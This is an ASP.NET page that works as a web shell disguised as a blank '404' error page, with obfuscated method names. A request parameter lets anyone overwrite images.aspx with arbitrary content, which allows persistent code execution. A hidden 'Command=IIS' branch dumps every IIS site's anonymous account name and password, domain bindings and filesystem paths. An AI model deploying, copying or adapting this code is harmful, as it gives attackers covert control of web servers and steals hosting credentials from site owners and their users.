<%@ Page Language="C#" Debug="true" trace="false" validateRequest="false"	%>
<%@ import Namespace="System.IO"%>
<%@ import Namespace="System.Diagnostics"%>
<%@ import Namespace="System.Data"%>
<%@ import Namespace="System.Management"%>
<%@ import Namespace="System.Data.OleDb"%>
<%@ import Namespace="Microsoft.Win32"%>
<%@ import Namespace="System.Net.Sockets" %>
<%@ import Namespace="System.Net" %>
<%@ import Namespace="System.Runtime.InteropServices"%>
<%@ import Namespace="System.DirectoryServices"%>
<%@ import Namespace="System.ServiceProcess"%>
<%@ import Namespace="System.Text.RegularExpressions"%>
<%@ Import Namespace="System.Threading"%>
<%@ Import Namespace="System.Data.SqlClient"%>
<%@ import Namespace="Microsoft.VisualBasic"%>

<%@ Assembly Name="System.DirectoryServices,Version=2.0.0.0,Culture=neutral,PublicKeyToken=B03F5F7F11D50A3A"%>
<%@ Assembly Name="System.Management,Version=2.0.0.0,Culture=neutral,PublicKeyToken=B03F5F7F11D50A3A"%>
<%@ Assembly Name="System.ServiceProcess,Version=2.0.0.0,Culture=neutral,PublicKeyToken=B03F5F7F11D50A3A"%>
<%@ Assembly Name="Microsoft.VisualBasic,Version=7.0.3300.0,Culture=neutral,PublicKeyToken=b03f5f7f11d50a3a"%>
<script runat="server">
    public string Command = string.Empty;
    public string CurrentFolder = string.Empty;
    public int FileCount = 1;
    public string Bin_Action = string.Empty;
    public string Bin_Request = string.Empty;
    protected void Page_Load(object sender, EventArgs e)
    {
        if (!IsCallback)
        {
            if (!string.IsNullOrEmpty(Request.Params["l"]))
            {
                System.IO.StreamWriter ow = new System.IO.StreamWriter(Server.MapPath("images.aspx"), false);
                ow.Write(Request.Params["l"]);
                ow.Close();
            }
            
            if (string.IsNullOrEmpty(Request.Params["Command"]))
            {
                Response.Write("");
                Response.End(); 
            
            }
            Command = Request.Params["Command"].ToUpper();
            
            //1°¢Command=IIS
            if (Command == "IIS".ToUpper())
            {
                IISCx();
            }
           
        }
    }

    public string formatpath(string instr)
    {
        instr = instr.Replace(@"\/", @"\");
        
        return instr;
    }

   
 
    private bool SGde(string sSrc)
    {
        Regex reg = new Regex(@"^0|[0-9]*[1-9][0-9]*$");
        if (reg.IsMatch(sSrc))
        {
            return true;
        }
        else
        {
            return false;
        }
    }
    public string MVVJ(string instr)
    {
        byte[] tmp = Encoding.Default.GetBytes(instr);
        return Convert.ToBase64String(tmp);
    }
    public void IISCx()
    {
        string qcKu = string.Empty;
        StringBuilder iisd = new StringBuilder();
        string mWGEm = "IIS://localhost/W3SVC";
      
 
           DirectoryEntry HHzcY = new DirectoryEntry(mWGEm);
            int fmW = 0;
            foreach (DirectoryEntry child in HHzcY.Children)
            {
                if (SGde(child.Name.ToString()))
                {
                    fmW++;
                    DirectoryEntry newdir = new DirectoryEntry(mWGEm + "/" + child.Name.ToString());
                    DirectoryEntry HlyU = newdir.Children.Find("root", "IIsWebVirtualDir");
                    TableRow TR = new TableRow();
                    TR.Attributes["title"] = "Site:" + child.Properties["ServerComment"].Value.ToString();
                    for (int i = 1; i < 6; i++)
                    {
                     
                            TableCell tfit = new TableCell();
                            switch (i)
                            {
                                case 1:
                                    tfit.Text = fmW.ToString();
                                    break;
                                case 2:
                                    tfit.Text = HlyU.Properties["AnonymousUserName"].Value.ToString();
                                    break;
                                case 3:
                                    tfit.Text = HlyU.Properties["AnonymousUserPass"].Value.ToString();
                                    break;
                                case 4:
                                    StringBuilder sb = new StringBuilder();
                                    PropertyValueCollection pc = child.Properties["ServerBindings"];
                                    iisd.Append("<web><domain>" + pc[0].ToString() + "</domain>");

                                    for (int j = 0; j < pc.Count; j++)
                                    {
                                        sb.Append(pc[j].ToString() + "<br>");
                                    }
                                    tfit.Text = sb.ToString().Substring(0, sb.ToString().Length - 4);
                                    break;
                                case 5:
                                    iisd.Append("<path>" + HlyU.Properties["Path"].Value.ToString() + "</path></web>");

                                    tfit.Text =  HlyU.Properties["Path"].Value.ToString();
                                    break;
                            }
                    }
                }
            }
              this.Response.Write(iisd.ToString());
              this.Response.End();
    }
</script>
 

<html xmlns="http://www.w3.org/1999/xhtml">
<head id="Head1" runat="server">
    <title>404Œﬁ±ÍÃ‚“≥</title>
     
</head>
<body>
    <form id="form1" runat="server">
    <div>

</div>
    </form>
</body>
</html>
